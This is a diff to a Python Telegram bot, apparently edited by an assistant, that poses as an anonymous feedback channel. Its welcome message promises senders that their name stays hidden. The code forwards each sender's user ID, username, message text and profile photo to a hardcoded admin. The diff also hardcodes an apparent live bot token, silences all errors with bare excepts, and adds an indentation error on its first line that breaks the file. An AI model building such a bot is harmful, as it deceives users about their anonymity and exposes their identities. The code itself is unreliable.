@@ -1,4 +1,4 @@
-from flask import Flask
+    from flask import Flask
 from threading import Thread
 import telebot
 import os
@@ -8,8 +8,7 @@ TOKEN = os.getenv("BOT_TOKEN")
 if not TOKEN:
     TOKEN = "8775388406:AAGe5pikRxUf6Tpy1INzl5Mx7Z5Jyua9LAc"
 
-# ⚠️ اینجا آیدی عددی خودت رو بذار (از @userinfobot بگیر)
-ADMIN_ID = 123456789  # ← این رو عوض کن
+ADMIN_ID = 8117214960  # اگه جواب نداد، با آیدی عددی خودت از @userinfobot عوض کن
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask('')
@@ -42,8 +41,8 @@ def start(message):
             f"آیدی: {user_id}\n"
             f"یوزرنیم: {username}"
         )
-    except Exception as e:
-        print(f"⚠️ خطا در ارسال به ادمین: {e}")
+    except:
+        pass
 
     # دریافت عکس پروفایل
     try:
@@ -51,12 +50,12 @@ def start(message):
         if photos and photos.total_count > 0:
             file_id = photos.photos[0][0].file_id
             bot.send_photo(ADMIN_ID, file_id, caption="🖼 عکس پروفایل کاربر")
-    except Exception as e:
-        print(f"⚠️ خطا در دریافت عکس: {e}")
+    except:
+        pass
 
-    # پیام خوش‌آمد به کاربر
-    bot.reply_to(
-        message,
+    # ✅ پیام خوش‌آمد به کاربر (دقیقاً همون متنی که خواستی)
+    bot.send_message(
+        message.chat.id,
         "سلام Ryan هستم! 🌹\n\nهر حرفی که تو دلت هست یا هر انتقادی که نسبت به من داری رو با خیال راحت بنویس و بفرست. بدون اینکه از اسمت باخبر بشم پیامت به من می‌رسه."
     )
 
@@ -72,8 +71,8 @@ def forward_all_messages(message):
             f"آیدی: {user.id}\n"
             f"متن: {text}"
         )
-    except Exception as e:
-        print(f"⚠️ خطا در ارسال پیام به ادمین: {e}")
+    except:
+        pass
 
     bot.reply_to(message, "✅ پیامت با موفقیت ارسال شد! 🙏")
 
@@ -83,6 +82,5 @@ print("🤖 ربات Ryan روشن شد...")
 while True:
     try:
         bot.infinity_polling(skip_pending=True)
-    except Exception as e:
-        print(f"⚠️ خطا: {e}")
+    except:
         time.sleep(5)
